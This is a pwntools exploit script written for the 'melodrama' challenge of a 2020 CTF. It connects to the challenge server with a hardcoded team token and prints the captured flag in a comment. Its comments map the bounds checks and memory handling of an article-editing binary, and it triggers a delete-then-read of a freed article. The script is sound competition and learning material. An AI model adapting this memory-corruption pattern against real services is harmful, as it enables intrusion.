# this exploit worked live during the ctf
#flag=ugra_nullptr_is_a_zero_0a6d04301407
from pwn import *
target=remote('melodrama.q.2020.ugractf.ru' , 17493)
token='025bc2ff21899d8d5143669be507a5e0'
target.sendline(token)
def init_index(option,index):
	print(target.recvuntil("> "))
	target.sendline(str(option))
	print(target.recvline())
	target.sendline(str(index))
	print(target.recvline())
#char content[141], scan 140 bytes into content + last null byte, check available article(0-63),
#article[i]={0,strlen(content),content,sig[0]=0}
def add_article(content):
	print(target.recvuntil("> "))
	target.sendline("1")
	print(target.recvline())
	target.send(content)
	print(target.recvline())
#get id,check id(0-63) and not null,get choice(1)
#get offset,check offset[0,articles[id]->length],getchar() max 141, with last being \x0a, replace with NULL
#find available edit slot[0,63],edits[i]={id,1,offset,strlen(content)+1,content}
def add_edit_insert(index,offset,content):	
	init_index(2,index)	
	target.sendline("1")
	print(target.recvline())
	target.sendline(str(offset))
	print(target.recvline())
	target.sendline(content)
	print(target.recvline())
#get id,check id(0-63) and not null,get choice(2)
#get offset, check offset[0,articles[id]->length],get count,check count(>0,offset+count-2<articles[id]->length)
#find available edit slot[0,63],edits[i]={id,2,offset,count,(NA)}
def add_edit_delete(index,offset,count):
	init_index(2,index)	
	target.sendline("2")
	print(target.recvline())	
	target.sendline(str(offset))
	print(target.recvline())
	target.sendline(str(count))
	print(target.recvline())
#get id(edit),check editid[0,63] and not null, article=edits[id]->article. check articles[article] not null,
#if edittype is insert: check sig[0] is null. check offset<=length, check strlen(content)+length<=140 ,refer shift func,refer insert func,
#length+=count,free_edit(edits[id]),free(edits[id]),edits[id]=0;
#if edittype is delete: check offset+count<=length, length-=count, refer shift func, free(edits[id]), edits[id]=0. 
def apply_edit(index):
	init_index(3,index)	
#get id, check id[0,63] and articles[id] not null,strcpy(articlesignature,signature)
def sign_article(index):	
	init_index(4,index)	
	print(target.recvline())
#get id,check id[0,63] and not null,if secret,can't read,puts(note). 
def read_article(index):
	init_index(5,index)	
#get id, check id[0,63] and not null,memset(articles[id],NULL)
def delete_article(index):
	print(target.recvuntil("> "))
	target.sendline("6")
	print(target.recvline())
	target.sendline(str(index))
def exit():
	print(target.recvuntil("> "))
	target.sendline("7")
delete_article(0)
read_article(0)
target.interactive()
